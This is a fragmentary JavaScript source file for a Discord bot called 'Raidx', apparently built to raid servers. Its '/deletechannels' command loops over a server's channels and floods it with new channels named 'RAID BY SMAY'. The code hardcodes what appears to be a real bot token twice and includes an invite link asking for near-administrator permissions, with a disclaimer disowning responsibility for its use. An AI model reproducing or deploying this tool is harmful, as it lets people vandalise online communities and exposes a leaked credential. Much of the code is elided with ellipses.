...
const token = "NzU2NTU2MjU3NDcyODA3MDUz.X2Tj6w.y7cQyK-C6zCo8xxjBoFuND_yPMk";
...
client.on('message', msg => {
    ...
    if(msg.content.startsWith('/deletechannels')){
      ...
      msg.channel.send("Deleting **" + i + "** channels!")
        msg.guild.channels.forEach(channel => 
            ...
            msg.guild.createChannel("RAID BY SMAY",{type: 'text'})
            .then(console.log)
            .catch(console.error);
        //}
    ...
    if(msg.content == "+/help"){/*
      ...
      .setTitle('Raidx')
      .setURL('google.es')
      .setDescription('EIEIEIEIEIEIEIEIEIEIEI')
      ...
      .setTimestamp()
        .setFooter('MADE BY SMAY', 'https://media.istockphoto.com/photos/letter-a-3d-red-isolated-on-white-with-shadow-orthogonal-projection-picture-id688125274?k=6&m=688125274&s=612x612&w=0&h=296XCpIcGlHejCFB7rpCecq7xC3O0C1pgvnUl0Z8AKc=');
        
      msg.channel.send(helpEmbed);
        */
       const embed = {
        "title": "Raidx",
        "description": "Love SmaY He Is My Creator :3.\nCreators are not resposible for what you do with it!",
        "url": "https://discord.com/oauth2/authorize?client_id=756556257472807053&scope=bot&permissions=2146958847",
        "color": 259797,
...
client.login("NzU2NTU2MjU3NDcyODA3MDUz.X2Tj6w.y7cQyK-C6zCo8xxjBoFuND_yPMk")